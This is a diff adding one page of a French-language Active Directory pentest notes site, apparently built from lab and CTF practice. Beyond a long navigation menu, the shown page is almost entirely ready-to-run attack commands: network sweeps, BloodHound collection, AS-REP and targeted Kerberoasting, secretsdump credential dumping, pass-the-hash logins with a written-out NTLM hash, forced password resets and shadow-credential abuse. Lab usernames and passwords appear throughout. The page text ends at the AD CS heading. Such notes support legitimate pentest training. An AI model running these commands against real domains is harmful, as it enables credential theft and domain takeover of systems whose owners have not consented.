@@ -1,0 +1,501 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>TI interne · AD Pentest Notes</title>
+<meta name="description" content="Test d&#x27;intrusion interne : AD CS (ESC1→ESC8), BloodHound, roasting, PtH, GPO abuse, Windows PrivEsc, exfiltration.">
+<link rel="preconnect" href="https://cdnjs.cloudflare.com">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github-dark.min.css">
+<link rel="stylesheet" href="assets/style.css">
+</head>
+<body>
+<button class="menu-toggle" id="menuToggle" aria-label="Menu">☰</button>
+<div class="layout">
+<nav class="side-nav" id="sideNav">
+<a class="brand" href="index.html"><span class="brand-mark">AD</span><span class="brand-txt">Active Directory<br><small>Pentest Notes</small></span></a>
+<div class="nav-search"><input type="text" id="navSearch" placeholder="Search all notes…  (press /)" autocomplete="off"><div id="searchResults" class="search-results"></div></div>
+<a class="nav-home" href="index.html">🏠 Overview</a>
+<a class="nav-home" href="search.html">🔎 Full-text search</a>
+<div class="nav-group">
+<button class="nav-group-btn" onclick="toggleGroup(this)"><span>📘 Things To Understand Prior</span><span class="chev">▸</span></button>
+<ul class="nav-sublist">
+<li><a href="00_things-to-understand-prior.html#ad-components">AD Components</a></li>
+<li><a href="00_things-to-understand-prior.html#active-directory-components">🧱 Active Directory Components</a></li>
+<li><a href="00_things-to-understand-prior.html#active-directory-structure">Active Directory Structure</a></li>
+<li><a href="00_things-to-understand-prior.html#example-of-domain-and-forest.">Example of Domain and Forest.</a></li>
+<li><a href="00_things-to-understand-prior.html#ad-authentication">AD Authentication</a></li>
+<li><a href="00_things-to-understand-prior.html#kerberos-authentication">Kerberos Authentication</a></li>
+<li><a href="00_things-to-understand-prior.html#step-by-step-kerberos-authentication">🔁 Step-by-Step Kerberos Authentication</a></li>
+<li><a href="00_things-to-understand-prior.html#pac-privilege-attribute-certificate">PAC (Privilege Attribute Certificate)</a></li>
+<li><a href="00_things-to-understand-prior.html#sam-security-system">Sam Security &amp;amp; System</a></li>
+<li><a href="00_things-to-understand-prior.html#lssas-lsa">Lssas &amp;amp; LSA</a></li>
+<li><a href="00_things-to-understand-prior.html#ntds.dit">NTDS.dit</a></li>
+<li><a href="00_things-to-understand-prior.html#dpapi-credential-manager">Dpapi ( Credential Manager )</a></li>
+<li><a href="00_things-to-understand-prior.html#ekeys">Ekeys</a></li>
+<li><a href="00_things-to-understand-prior.html#a.-pass-the-key-kerberos">✔ A. Pass-The-Key (Kerberos)</a></li>
+<li><a href="00_things-to-understand-prior.html#b.-pass-the-hash-ntlm">✔ B. Pass-The-Hash (NTLM)</a></li>
+<li><a href="00_things-to-understand-prior.html#c.-silver-ticket-forging">✔ C. Silver Ticket Forging</a></li>
+<li><a href="00_things-to-understand-prior.html#d.-persistence">✔ D. Persistence</a></li>
+<li><a href="00_things-to-understand-prior.html#rid-enumeration-deep-dive-core-logic-brute-force-working-user-enumeration">🔥 RID Enumeration — Deep Dive (Core Logic + Brute Force Working) + User Enumeration</a></li>
+</ul></div>
+<div class="nav-group">
+<button class="nav-group-btn" onclick="toggleGroup(this)"><span>⚔️ Attacks + Lateral Movement</span><span class="chev">▸</span></button>
+<ul class="nav-sublist">
+<li><a href="01_attacks-lateral-movement.html#bloodhound">BloodHound</a></li>
+<li><a href="01_attacks-lateral-movement.html#local-admin-hunting">Local Admin Hunting</a></li>
+<li><a href="01_attacks-lateral-movement.html#llmnrnbt-ns-poisoning">LLMNR/NBT-NS Poisoning</a></li>
+<li><a href="01_attacks-lateral-movement.html#objective">🔍 Objective</a></li>
+<li><a href="01_attacks-lateral-movement.html#overview">🧭 Overview</a></li>
+<li><a href="01_attacks-lateral-movement.html#purpose-of-llmnrnbt-ns">📦 Purpose of LLMNR/NBT-NS</a></li>
+<li><a href="01_attacks-lateral-movement.html#llmnr---link-local-multicast-name-resolution">🔗 LLMNR - Link-Local Multicast Name Resolution</a></li>
+<li><a href="01_attacks-lateral-movement.html#nbt-ns---netbios-name-service">📛 NBT-NS - NetBIOS Name Service</a></li>
+<li><a href="01_attacks-lateral-movement.html#security-flaw-in-both-protocols">🚨 Security Flaw in Both Protocols</a></li>
+<li><a href="01_attacks-lateral-movement.html#real-world-exploitation-workflow">🎯 Real-World Exploitation Workflow</a></li>
+<li><a href="01_attacks-lateral-movement.html#differences-between-llmnr-nbt-ns">🧠 Differences Between LLMNR &amp;amp; NBT-NS</a></li>
+<li><a href="01_attacks-lateral-movement.html#quick-example-llmnrnbt-ns-poisoning-flow-with-responder">🧪 Quick Example – LLMNR/NBT-NS Poisoning Flow (with Responder)</a></li>
+<li><a href="01_attacks-lateral-movement.html#summary-table">🧾 Summary Table</a></li>
+<li><a href="01_attacks-lateral-movement.html#defense-tips">🛡️ Defense Tips</a></li>
+<li><a href="01_attacks-lateral-movement.html#attack-flow-example">🧪 Attack Flow Example</a></li>
+<li><a href="01_attacks-lateral-movement.html#tools-used">🛠️ Tools Used</a></li>
+<li><a href="01_attacks-lateral-movement.html#responder-options-and-usage">⚙️ Responder Options and Usage</a></li>
+<li><a href="01_attacks-lateral-movement.html#responder-output-log-files">📁 Responder Output: Log Files</a></li>
+<li><a href="01_attacks-lateral-movement.html#cracking-captured-ntlmv2-hash-with-hashcat">🔓 Cracking Captured NTLMv2 Hash with Hashcat</a></li>
+<li><a href="01_attacks-lateral-movement.html#required-open-ports-on-attacker-system-for-responder">🧨 Required Open Ports on Attacker System (for Responder)</a></li>
+<li><a href="01_attacks-lateral-movement.html#use-cases-after-cracking-hashes">🪪 Use Cases After Cracking Hashes</a></li>
+<li><a href="01_attacks-lateral-movement.html#tips">🧠 Tips</a></li>
+<li><a href="01_attacks-lateral-movement.html#recap-of-flow">🔄 Recap of Flow</a></li>
+<li><a href="01_attacks-lateral-movement.html#attack-workflow-windows-inveigh-based-llmnrnbt-ns-poisoning">🚩 Attack Workflow (Windows Inveigh-Based LLMNR/NBT-NS Poisoning)</a></li>
+<li><a href="01_attacks-lateral-movement.html#sample-output-of-c-inveigh-cli-based">🧮 Sample Output of C# Inveigh (CLI-based)</a></li>
+<li><a href="01_attacks-lateral-movement.html#post-capture-actions">🧑‍💻 Post-Capture Actions</a></li>
+<li><a href="01_attacks-lateral-movement.html#remediation-mitigation">🔐 Remediation &amp;amp; Mitigation</a></li>
+<li><a href="01_attacks-lateral-movement.html#smb-ntml-relay-attacks">SMB / NTML Relay Attacks</a></li>
+<li><a href="01_attacks-lateral-movement.html#as-rep-roasting">AS-REP Roasting</a></li>
+<li><a href="01_attacks-lateral-movement.html#kerberoasting">Kerberoasting</a></li>
+<li><a href="01_attacks-lateral-movement.html#dcsync">DCSync</a></li>
+<li><a href="01_attacks-lateral-movement.html#pass-the-hash">Pass The Hash</a></li>
+<li><a href="01_attacks-lateral-movement.html#pass-the-ticket">Pass The Ticket</a></li>
+<li><a href="01_attacks-lateral-movement.html#pass-the-certificate">Pass The Certificate</a></li>
+<li><a href="01_attacks-lateral-movement.html#priv-esc---across-domain-trusts---ad-cs">Priv Esc - Across domain trusts - AD CS</a></li>
+<li><a href="01_attacks-lateral-movement.html#what-is-certify">🔧 What is Certify?</a></li>
+<li><a href="01_attacks-lateral-movement.html#summary-of-escalation-techniques-used">🔐 Summary of Escalation Techniques Used</a></li>
+<li><a href="01_attacks-lateral-movement.html#background-ad-cs-cross-domain-trust">🔥 BACKGROUND: AD CS + Cross-Domain Trust</a></li>
+<li><a href="01_attacks-lateral-movement.html#esc3-exploiting-certificate-request-agent-misconfiguration">🔓 ESC3 — Exploiting Certificate Request Agent Misconfiguration</a></li>
+<li><a href="01_attacks-lateral-movement.html#escalation-to-enterprise-admin-ea-same-concept">🔥 Escalation to Enterprise Admin (EA) (Same concept)</a></li>
+<li><a href="01_attacks-lateral-movement.html#esc1-enrollee-supplies-subject-misconfiguration">🔥 ESC1 — Enrollee Supplies Subject Misconfiguration</a></li>
+<li><a href="01_attacks-lateral-movement.html#step-by-step-guide">🧭 Step-by-Step Guide</a></li>
+<li><a href="01_attacks-lateral-movement.html#shadow-key-credentials-attack">Shadow Key Credentials Attack</a></li>
+<li><a href="01_attacks-lateral-movement.html#gmsa">GMSA</a></li>
+<li><a href="01_attacks-lateral-movement.html#laps">LAPS</a></li>
+<li><a href="01_attacks-lateral-movement.html#where-is-the-laps-password-stored-1">💻 Where is the LAPS Password Stored?</a></li>
+<li><a href="01_attacks-lateral-movement.html#as-an-attacker-why-you-care">🔍 As an Attacker: Why You Care</a></li>
+<li><a href="01_attacks-lateral-movement.html#how-to-enumerate-laps">🧪 How to Enumerate LAPS</a></li>
+<li><a href="01_attacks-lateral-movement.html#unconstrained-delegation">Unconstrained Delegation</a></li>
+<li><a href="01_attacks-lateral-movement.html#constrained-delegation">Constrained Delegation</a></li>
+<li><a href="01_attacks-lateral-movement.html#what-the-kdc-checks">What the KDC Checks</a></li>
+<li><a href="01_attacks-lateral-movement.html#enumeration-of-constrained-delegation">🔍 Enumeration of Constrained Delegation</a></li>
+<li><a href="01_attacks-lateral-movement.html#exploiting-with-rubeus">🧪 Exploiting with Rubeus</a></li>
+<li><a href="01_attacks-lateral-movement.html#bonus-abuse-via-alternate-services-altservice">⚠️ Bonus: Abuse via Alternate Services (altservice)</a></li>
+<li><a href="01_attacks-lateral-movement.html#defensive-notes">🔐 Defensive Notes</a></li>
+<li><a href="01_attacks-lateral-movement.html#rbcd">RBCD</a></li>
+<li><a href="01_attacks-lateral-movement.html#conditions-to-perform-the-attack">Conditions to Perform the Attack</a></li>
+<li><a href="01_attacks-lateral-movement.html#step-2-s4u2proxy-second-hop">6️⃣ Step 2: S4U2Proxy (Second Hop)</a></li>
+<li><a href="01_attacks-lateral-movement.html#rodc-golden-ticket-keylist-attack---extra">RODC = Golden Ticket + Keylist Attack - Extra</a></li>
+<li><a href="01_attacks-lateral-movement.html#root-cause">🔑 Root Cause</a></li>
+<li><a href="01_attacks-lateral-movement.html#trust-is-controlled-by">❗ Trust is Controlled By:</a></li>
+<li><a href="01_attacks-lateral-movement.html#you-broke-the-model-by">🔥 You Broke the Model By:</a></li>
+<li><a href="01_attacks-lateral-movement.html#bad-successor-dmsa-abuse">Bad Successor ( dMSA Abuse )</a></li>
+<li><a href="01_attacks-lateral-movement.html#reality">Reality</a></li>
+<li><a href="01_attacks-lateral-movement.html#these-accounts-usually-have">These Accounts Usually Have</a></li>
+<li><a href="01_attacks-lateral-movement.html#msa">MSA</a></li>
+<li><a href="01_attacks-lateral-movement.html#gmsa-1">gMSA</a></li>
+<li><a href="01_attacks-lateral-movement.html#dmsa">dMSA</a></li>
+</ul></div>
+<div class="nav-group">
+<button class="nav-group-btn" onclick="toggleGroup(this)"><span>🔑 Permissions Abuse</span><span class="chev">▸</span></button>
+<ul class="nav-sublist">
+<li><a href="02_permissions-abuse.html#dacl-sacl">DACL &amp;amp; SACL</a></li>
+<li><a href="02_permissions-abuse.html#genericwrite">🔐 GenericWrite</a></li>
+<li><a href="02_permissions-abuse.html#generic-all">Generic All</a></li>
+<li><a href="02_permissions-abuse.html#write-dacl">Write DACL</a></li>
+<li><a href="02_permissions-abuse.html#all-extended-rights">All Extended Rights</a></li>
+<li><a href="02_permissions-abuse.html#write-owner">Write Owner</a></li>
+<li><a href="02_permissions-abuse.html#ou-abuse">OU Abuse</a></li>
+<li><a href="02_permissions-abuse.html#genericall-write-on-ou">GenericAll / Write on OU</a></li>
+<li><a href="02_permissions-abuse.html#gpo-abuse">GPO Abuse</a></li>
+</ul></div>
+<div class="nav-group">
+<button class="nav-group-btn" onclick="toggleGroup(this)"><span>🔒 Persistence</span><span class="chev">▸</span></button>
+<ul class="nav-sublist">
+<li><a href="03_persistence.html#golden-ticket-attack">Golden Ticket Attack</a></li>
+<li><a href="03_persistence.html#how-the-golden-ticket-attack-works-step-by-step">🔧 How the Golden Ticket Attack Works (Step-by-Step)</a></li>
+<li><a href="03_persistence.html#what-if-we-impersonate-a-non-existing-user">What if we impersonate a non-existing user?</a></li>
+<li><a href="03_persistence.html#step-1-obtain-the-krbtgt-hash">🔑 Step 1 — Obtain the krbtgt Hash</a></li>
+<li><a href="03_persistence.html#method-1-using-dcsync-most-common">Method 1 — Using DCSync (Most Common)</a></li>
+<li><a href="03_persistence.html#diamond-ticket-attack">Diamond Ticket Attack</a></li>
+<li><a href="03_persistence.html#sliver-ticket-attack">Sliver Ticket Attack</a></li>
+<li><a href="03_persistence.html#what-is-a-silver-ticket-attack">🚀 What is a Silver Ticket Attack?</a></li>
+<li><a href="03_persistence.html#step-by-step-exploitation">⚔️ Step-by-Step Exploitation</a></li>
+<li><a href="03_persistence.html#difference-between-golden-silver-diamond">Difference Between Golden Silver &amp;amp; Diamond</a></li>
+<li><a href="03_persistence.html#persistence-using-acl--adminsdholder---domain-persistence">Persistence using ACL -AdminSDHolder - Domain Persistence</a></li>
+<li><a href="03_persistence.html#dsrm-attack---domain-persistence">DSRM Attack - Domain Persistence</a></li>
+<li><a href="03_persistence.html#skeleton-key-attack">Skeleton Key Attack</a></li>
+</ul></div>
+<div class="nav-group">
+<button class="nav-group-btn" onclick="toggleGroup(this)"><span>🌲 Forest privilege escalation / trust abuse technique</span><span class="chev">▸</span></button>
+<ul class="nav-sublist">
+<li><a href="04_forest-privilege-escalation-trust-abuse-technique.html#golden-ticket-attack-sid-prime-attack">Golden Ticket Attack + SID Prime Attack</a></li>
+<li><a href="04_forest-privilege-escalation-trust-abuse-technique.html#extra-sid-attack">Extra Sid Attack</a></li>
+<li><a href="04_forest-privilege-escalation-trust-abuse-technique.html#alternative-golden-ticket-via-rubeus">🧪 Alternative: Golden Ticket via Rubeus</a></li>
+<li><a href="04_forest-privilege-escalation-trust-abuse-technique.html#step-8-dcsync-from-parent-domain-privilege-confirm">📤 Step 8: DCSync from Parent Domain (Privilege Confirm)</a></li>
+</ul></div>
+<div class="nav-group open">
+<button class="nav-group-btn" onclick="toggleGroup(this)"><span>🖥️ TI interne</span><span class="chev">▸</span></button>
+<ul class="nav-sublist">
+<li><a href="05_ti-interne.html#ère-étape-découverte-réseau">1ère étape – Découverte réseau</a></li>
+<li><a href="05_ti-interne.html#bloodhound">BloodHound</a></li>
+<li><a href="05_ti-interne.html#enum-acl">Enum ACL</a></li>
+<li><a href="05_ti-interne.html#énumération-ldap">Énumération LDAP</a></li>
+<li><a href="05_ti-interne.html#domain-computers-abus-machineaccountquota">Domain computers (abus MachineAccountQuota)</a></li>
+<li><a href="05_ti-interne.html#ipc-null-session-enumération-sid">IPC$ / null session → enumération SID</a></li>
+<li><a href="05_ti-interne.html#kerberoasting-aveugle-blind-kerberoast">Kerberoasting aveugle (blind kerberoast)</a></li>
+<li><a href="05_ti-interne.html#exploit-krb5.keytab">Exploit krb5.keytab</a></li>
+<li><a href="05_ti-interne.html#force-change-password">Force Change Password</a></li>
+<li><a href="05_ti-interne.html#generic-all-abus-complet-sur-un-objet">Generic All (abus complet sur un objet)</a></li>
+<li><a href="05_ti-interne.html#genericwrite-targeted-kerberoast-shadow-credentials">GenericWrite → Targeted Kerberoast / Shadow Credentials</a></li>
+<li><a href="05_ti-interne.html#backup-operators-locally">Backup Operators (locally)</a></li>
+<li><a href="05_ti-interne.html#templates-ad-cs-rappel">Templates AD CS (rappel)</a></li>
+<li><a href="05_ti-interne.html#ad-cs-énumération-et-exploitation-esc1-esc8">AD CS – Énumération et exploitation (ESC1 → ESC8)</a></li>
+<li><a href="05_ti-interne.html#gpo-abuse-privilege-escalation">GPO Abuse – Privilege Escalation</a></li>
+<li><a href="05_ti-interne.html#pass-the-hash-pth">Pass the Hash (PtH)</a></li>
+<li><a href="05_ti-interne.html#psexec">PSExec</a></li>
+<li><a href="05_ti-interne.html#smb-sans-signature-relais">SMB sans signature (relais)</a></li>
+<li><a href="05_ti-interne.html#ntlm-theft">NTLM theft</a></li>
+<li><a href="05_ti-interne.html#password-spraying-ntlm-http">Password Spraying (NTLM HTTP)</a></li>
+<li><a href="05_ti-interne.html#reverse-shell-windows-msfvenom-smb">Reverse shell Windows (msfvenom + SMB)</a></li>
+<li><a href="05_ti-interne.html#exfiltration-canaux-variés">Exfiltration (canaux variés)</a></li>
+<li><a href="05_ti-interne.html#évasion-av-powercat-download-cradle">Évasion AV (powercat / download-cradle)</a></li>
+<li><a href="05_ti-interne.html#génération-de-listes-dutilisateurs">Génération de listes d’utilisateurs</a></li>
+<li><a href="05_ti-interne.html#windows-privesc-résumé-des-vecteurs">Windows PrivEsc (résumé des vecteurs)</a></li>
+</ul></div>
+<div class="nav-group">
+<button class="nav-group-btn" onclick="toggleGroup(this)"><span>🌐 Pentest web</span><span class="chev">▸</span></button>
+<ul class="nav-sublist">
+<li><a href="06_pentest-web.html#énumération">Énumération</a></li>
+<li><a href="06_pentest-web.html#apache-2.4.49-path-traversal-rce-cve-2021-41773">Apache 2.4.49 – Path Traversal / RCE (CVE-2021-41773)</a></li>
+<li><a href="06_pentest-web.html#php-wrappers-lfi">PHP wrappers / LFI</a></li>
+<li><a href="06_pentest-web.html#tomcat-war-reverse-shell">Tomcat – WAR reverse shell</a></li>
+<li><a href="06_pentest-web.html#bypass-auth-brute-force">Bypass auth – Brute force</a></li>
+<li><a href="06_pentest-web.html#cms">CMS</a></li>
+<li><a href="06_pentest-web.html#code-injection-payloads">Code injection – Payloads</a></li>
+<li><a href="06_pentest-web.html#ssti">SSTI</a></li>
+<li><a href="06_pentest-web.html#sql-injection">SQL Injection</a></li>
+<li><a href="06_pentest-web.html#nosql-injection">NoSQL Injection</a></li>
+<li><a href="06_pentest-web.html#xxe">XXE</a></li>
+<li><a href="06_pentest-web.html#xss">XSS</a></li>
+<li><a href="06_pentest-web.html#csrf-payloads">CSRF – Payloads</a></li>
+<li><a href="06_pentest-web.html#node.js-reverse-shell-deserialization">Node.js – Reverse shell (deserialization)</a></li>
+<li><a href="06_pentest-web.html#php-hmac">PHP – HMAC</a></li>
+<li><a href="06_pentest-web.html#docker-registry-enumération-via-curl">Docker registry – Enumération via curl</a></li>
+<li><a href="06_pentest-web.html#outils">Outils</a></li>
+</ul></div>
+<div class="nav-group">
+<button class="nav-group-btn" onclick="toggleGroup(this)"><span>☁️ Cloud &amp; K8s</span><span class="chev">▸</span></button>
+<ul class="nav-sublist">
+<li><a href="07_cloud-k8s.html#docker-bases">Docker (bases)</a></li>
+<li><a href="07_cloud-k8s.html#kubernetes-kube">Kubernetes (Kube)</a></li>
+<li><a href="07_cloud-k8s.html#azure-cli-devops">Azure CLI (DevOps)</a></li>
+<li><a href="07_cloud-k8s.html#scénarios-dattaque-azure-devops-ci-cd">Scénarios d’attaque Azure DevOps / CI-CD</a></li>
+<li><a href="07_cloud-k8s.html#terraform-state-file-prise-de-contrôle-pipeline-study-case">Terraform state file → prise de contrôle pipeline (study case)</a></li>
+<li><a href="07_cloud-k8s.html#détection-de-vulnérabilités-iac-checkov-terra">Détection de vulnérabilités IaC (Checkov / Terra)</a></li>
+<li><a href="07_cloud-k8s.html#llm-prompt-injection">LLM (prompt injection)</a></li>
+<li><a href="07_cloud-k8s.html#owasp-top-10-cicd-security-risks">OWASP Top 10 CI/CD Security Risks</a></li>
+<li><a href="07_cloud-k8s.html#outils-daudit-k8s-cloud">Outils d’audit K8s / Cloud</a></li>
+</ul></div>
+<div class="nav-group">
+<button class="nav-group-btn" onclick="toggleGroup(this)"><span>🧰 Priv escalation &amp; Tools</span><span class="chev">▸</span></button>
+<ul class="nav-sublist">
+<li><a href="08_privesc-tools.html#linux-privesc">Linux PrivEsc</a></li>
+<li><a href="08_privesc-tools.html#reverse-shells">Reverse shells</a></li>
+<li><a href="08_privesc-tools.html#upgrade-shell-tty">Upgrade shell (TTY)</a></li>
+<li><a href="08_privesc-tools.html#pivoting-rpivot">Pivoting (rpivot)</a></li>
+<li><a href="08_privesc-tools.html#port-knocking">Port knocking</a></li>
+<li><a href="08_privesc-tools.html#python-jail-escape">Python jail escape</a></li>
+<li><a href="08_privesc-tools.html#insecure-deserialization-php">Insecure deserialization (PHP)</a></li>
+<li><a href="08_privesc-tools.html#bypass-command-line-obfuscation">Bypass command line (obfuscation)</a></li>
+<li><a href="08_privesc-tools.html#john-the-ripper">John the Ripper</a></li>
+<li><a href="08_privesc-tools.html#tls">TLS</a></li>
+<li><a href="08_privesc-tools.html#wayback-recon-passif">Wayback / recon passif</a></li>
+<li><a href="08_privesc-tools.html#google-dorks-extraits">Google Dorks (extraits)</a></li>
+<li><a href="08_privesc-tools.html#boîte-à-outils-tools">Boîte à outils (TOOLS)</a></li>
+</ul></div>
+<div class="nav-group">
+<button class="nav-group-btn" onclick="toggleGroup(this)"><span>✅ Web Vulnerability Checklist</span><span class="chev">▸</span></button>
+<ul class="nav-sublist">
+<li><a href="09_web-vuln-checklist.html#fa-bypass">2FA Bypass</a></li>
+<li><a href="09_web-vuln-checklist.html#bypass">403 Bypass</a></li>
+<li><a href="09_web-vuln-checklist.html#account-takeover-ato">Account Takeover (ATO)</a></li>
+<li><a href="09_web-vuln-checklist.html#admin-panel">Admin panel</a></li>
+<li><a href="09_web-vuln-checklist.html#aem-adobe-experience-manager">AEM (Adobe Experience Manager)</a></li>
+<li><a href="09_web-vuln-checklist.html#api-authentication-authorization">API Authentication / Authorization</a></li>
+<li><a href="09_web-vuln-checklist.html#authentication">Authentication</a></li>
+<li><a href="09_web-vuln-checklist.html#business-logic">Business Logic</a></li>
+<li><a href="09_web-vuln-checklist.html#cookie-attacks">Cookie Attacks</a></li>
+<li><a href="09_web-vuln-checklist.html#csrf">CSRF</a></li>
+<li><a href="09_web-vuln-checklist.html#exif-geolocation">EXIF / Geolocation</a></li>
+<li><a href="09_web-vuln-checklist.html#file-upload">File Upload</a></li>
+<li><a href="09_web-vuln-checklist.html#django-symfony">Django / Symfony</a></li>
+<li><a href="09_web-vuln-checklist.html#idor">IDOR</a></li>
+<li><a href="09_web-vuln-checklist.html#jira">Jira</a></li>
+<li><a href="09_web-vuln-checklist.html#mass-assignment">Mass Assignment</a></li>
+<li><a href="09_web-vuln-checklist.html#rate-limit-bypass">Rate limit bypass</a></li>
+<li><a href="09_web-vuln-checklist.html#rce-chaînes">RCE (chaînes)</a></li>
+<li><a href="09_web-vuln-checklist.html#register">Register</a></li>
+<li><a href="09_web-vuln-checklist.html#reset-password">Reset password</a></li>
+<li><a href="09_web-vuln-checklist.html#rxss">RXSS</a></li>
+<li><a href="09_web-vuln-checklist.html#sql-injection-payloads">SQL injection (payloads)</a></li>
+<li><a href="09_web-vuln-checklist.html#tips-twitterveille">Tips (Twitter/veille)</a></li>
+</ul></div>
+</nav>
+<main class="content">
+
+<div class="page-head">
+  <div class="crumb"><a href="index.html">Notes</a> ›</div>
+  <h1 class="page-title">🖥️ TI interne</h1>
+  <p class="page-desc">Test d&#x27;intrusion interne : AD CS (ESC1→ESC8), BloodHound, roasting, PtH, GPO abuse, Windows PrivEsc, exfiltration.</p>
+</div>
+<div class="article-wrap">
+  <article class="article"><h1 id="ti-interne">TI interne</h1>
+<p>Notes de terrain pour les tests d’intrusion internes Active Directory / réseau (données de lab).</p>
+<h2 id="ère-étape-découverte-réseau">1ère étape – Découverte réseau</h2>
+<pre class="bash"><code>sudo nmap -sn -n 10.200.142.0/24 -oA Ping-Sweep
+# Port scanning Windows
+nmap 10.200.69.30,31,35 -Pn -n -T5
+# Pivot SSH
+sshuttle -r linux-admin@10.200.108.33 10.200.108.0/24 192.168.100.0/24
+xfreerdp /v:za.tryhackme.com /u:kerry.murray /d:thmjmp1.za.tryhackme.com</code></pre>
+<h2 id="bloodhound">BloodHound</h2>
+<p>Collecte via netexec (LDAP) :</p>
+<pre class="bash"><code>nxc ldap $DC_IP -u &#39;Brandon_Boyd&#39; -p &#39;&#39; --bloodhound -c all --dns-server $DC_IP</code></pre>
+<h2 id="enum-acl">Enum ACL</h2>
+<p>Recherche des objets modifiables (via bloodyAD) :</p>
+<pre class="bash"><code>bloodyad --host 10.129.37.22 --dns 10.129.37.22 -d checkpoint.htb -u alex.turner -p &#39;Checkpoint2024!&#39; get writable</code></pre>
+<h2 id="énumération-ldap">Énumération LDAP</h2>
+<pre class="bash"><code>ldapdomaindump --user &quot;northbridge.corp\\_svrautomationsvc&quot; --password &#39;REDACTED&#39; --outdir ldapdomaindump &quot;10.1.235.111&quot;</code></pre>
+<h2 id="domain-computers-abus-machineaccountquota">Domain computers (abus MachineAccountQuota)</h2>
+<pre class="bash"><code># Ajout d&#39;un compte machine via netexec (cache Kerberos)
+nxc smb anomaly-dc.anomaly.hsm -k --use-kcache -M add-computer -o NAME=&quot;TOMMYPC&quot; PASSWORD=&#39;Password1!&#39;
+
+# Lire le quota ms-DS-MachineAccountQuota
+bloodyAD -u Brandon_Boyd -p &#39;3edc4rfv#EDC$RFV&#39; -d anomaly.hsm --dc-ip 10.1.111.114 \
+  get object &#39;DC=ANOMALY,DC=HSM&#39; --attr ms-DS-MachineAccountQuota
+
+# Ajouter un ordinateur
+bloodyAD -u &#39;Brandon_Boyd&#39; -p &#39;3edc4rfv#EDC$RFV&#39; -d anomaly.hsm --dc-ip 10.1.111.114 \
+  add computer tensai &#39;Nan2004&#39;</code></pre>
+<h2 id="ipc-null-session-enumération-sid">IPC$ / null session → enumération SID</h2>
+<pre class="bash"><code>python3 /usr/share/doc/python3-impacket/examples/lookupsid.py anonymous@10.10.55.168 | tee users.txt
+grep SidTypeUser users.txt | awk &#39;{print $2}&#39; | cut -d &quot;\\&quot; -f2 &gt; users.txt
+
+# AS-REP roasting sur la liste d&#39;utilisateurs
+python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py -dc-ip 10.10.100.15 \
+  -usersfile users.txt -no-pass vulnnet-rst.local/
+
+# Exemple : t-skid / tj072889*
+smbclient -U vulnnet-rst.local/t-skid //10.10.100.15/NETLOGON
+# Creds dans un script VBS : a-whitehat / bNdKVkjv3RR9ht
+evil-winrm -i 10.10.100.15 -u a-whitehat -p &quot;bNdKVkjv3RR9ht&quot;
+python3 secretsdump.py vulnnet-rst.local/a-whitehat:bNdKVkjv3RR9ht@10.10.100.15
+evil-winrm -i 10.10.55.168 -u administrator -H &quot;c2597747aa5e43022a3a3049a3c3b09d&quot;</code></pre>
+<h2 id="kerberoasting-aveugle-blind-kerberoast">Kerberoasting aveugle (blind kerberoast)</h2>
+<pre class="bash"><code>GetUserSPNs.py -no-preauth t.spivey -usersfile valid_users.txt -dc-host 10.0.30.244 tri.lab/</code></pre>
+<h2 id="exploit-krb5.keytab">Exploit krb5.keytab</h2>
+<pre class="bash"><code>kinit -kt krb5.keytab Brandon_Boyd@ANOMALY.HSM
+klist
+export KRB5CCNAME=/tmp/krb5cc_1000
+nxc smb 10.1.111.114 -u Brandon_Boyd -k --use-kcache</code></pre>
+<h2 id="force-change-password">Force Change Password</h2>
+<pre class="bash"><code>net rpc password &quot;svc_web&quot; &#39;Welcome2025!@&#39; -U &quot;WELCOME.local&quot;/&quot;i.park&quot;%&#39;Welcome2025!@&#39; -S &quot;10.0.30.32&quot;</code></pre>
+<h2 id="generic-all-abus-complet-sur-un-objet">Generic All (abus complet sur un objet)</h2>
+<p>Changement de mot de passe d’un utilisateur ciblé via <strong>bloodyAD</strong> :</p>
+<pre class="bash"><code>bloodyAD --host &quot;10.1.8.188&quot; -d &quot;DC01.hacksmarter.local&quot; -u &quot;alt.svc&quot; -p &quot;REDACTED&quot; \
+  set password &quot;yorinobu&quot; &quot;newP@ssword2022&quot;</code></pre>
+<h3 id="t1558.003-targeted-kerberoasting-moins-bruyant-que-le-changement-de-mot-de-passe">T1558.003 – Targeted Kerberoasting (moins bruyant que le changement de mot de passe)</h3>
+<pre class="bash"><code>git clone https://github.com/ShutdownRepo/targetedKerberoast.git
+./targetedKerberoast.py --dc-ip &#39;192.168.1.8&#39; -v -d &#39;ignite.local&#39; -u &#39;nishant&#39; -p &#39;Password@1&#39;</code></pre>
+<p>Variante PowerView (Windows) : positionner un SPN sur la cible, demander le TGS, puis cracker hors-ligne avec Hashcat.</p>
+<h3 id="t1110.001-changement-de-mot-de-passe-plusieurs-méthodes">T1110.001 – Changement de mot de passe (plusieurs méthodes)</h3>
+<pre class="bash"><code># Linux net rpc (Samba)
+net rpc password vipin &#39;Password@987&#39; -U ignite.local/nishant%&#39;Password@1&#39; -S 192.168.1.8
+# bloodyAD
+bloodyAD --host &quot;192.168.1.8&quot; -d &quot;ignite.local&quot; -u &quot;nishant&quot; -p &quot;Password@1&quot; set password &quot;vipin&quot; &quot;Password@9876&quot;
+# rpcclient
+rpcclient -U ignite.local/nishant 192.168.1.8   # puis: setuserinfo vipin 23 Ignite@987
+# Windows net
+net user Vipin Password@1234 /domain
+# PowerView
+Set-DomainUserPassword -Identity &#39;vipin&#39; -AccountPassword $NewPassword</code></pre>
+<h2 id="genericwrite-targeted-kerberoast-shadow-credentials">GenericWrite → Targeted Kerberoast / Shadow Credentials</h2>
+<pre class="bash"><code>python3 targetedKerberoast.py -v --dc-ip 10.0.27.56 -d hacksmarter.local -u yorinobu -p &#39;Password@987&#39; --request-user soulkiller.svc
+# Shadow Credentials (écriture sur msDS-KeyCredentialLink) via Certipy
+certipy shadow auto -u &#39;yorinobu@hacksmarter.local&#39; -p &#39;newP@ssword2022&#39; -account &#39;soulkiller.svc&#39; -dc-ip 10.1.8.188</code></pre>
+<h2 id="backup-operators-locally">Backup Operators (locally)</h2>
+<pre class="bash"><code>impacket-reg ghill_sa:&#39;P@ssw0rd!&#39;@10.1.217.65 backup -o &#39;C:/users/ghill_sa/desktop&#39;</code></pre>
+<h2 id="templates-ad-cs-rappel">Templates AD CS (rappel)</h2>
